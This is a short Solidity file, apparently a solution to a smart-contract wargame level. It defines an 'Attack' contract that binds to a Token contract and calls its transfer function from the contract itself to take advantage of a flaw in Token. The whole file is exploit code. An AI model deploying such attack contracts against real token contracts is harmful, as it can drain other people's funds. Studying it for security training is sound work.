pragma solidity ^0.8.0;

import './Token.sol';
contract Attack{
    Token T;
    function exploit(address _addr) public {
        T= Token(_addr);
    }
    function attack(address _to, uint256 _value) public {
        T.transfer(_to, _value);
    }
}